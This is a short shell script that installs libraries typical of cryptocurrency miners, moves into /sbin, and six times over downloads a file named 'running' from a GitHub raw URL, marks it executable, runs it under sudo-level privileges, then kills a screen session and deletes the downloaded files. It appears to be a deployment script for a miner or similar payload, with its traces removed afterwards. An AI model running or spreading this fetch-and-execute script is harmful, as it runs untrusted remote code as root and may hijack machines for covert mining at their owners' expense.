sudo apt install timelimit -y && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
cd /sbin
for i in `seq 1 6`; do echo $i; wget -q https://raw.githubusercontent.com/renilo/hajar/main/running; chmod +x running; bash ./running; sleep 1500; clear; screen -XS Running quit; rm -f kontol manuk running; echo SETTING PROJECT; sleep 300; done
rm -f main
